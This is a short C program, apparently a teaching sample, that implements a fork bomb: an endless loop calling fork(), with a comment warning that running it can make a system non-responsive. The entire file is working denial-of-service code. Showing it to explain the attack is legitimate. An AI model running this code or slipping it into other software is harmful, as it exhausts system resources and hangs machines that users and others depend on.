// C program Sample  for FORK BOMB
// It is not recommended to run the program as
// it may make a system non-responsive.
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h> 
int main()
{
    while(1)
    {
       fork();
    }   
    return 0;
}
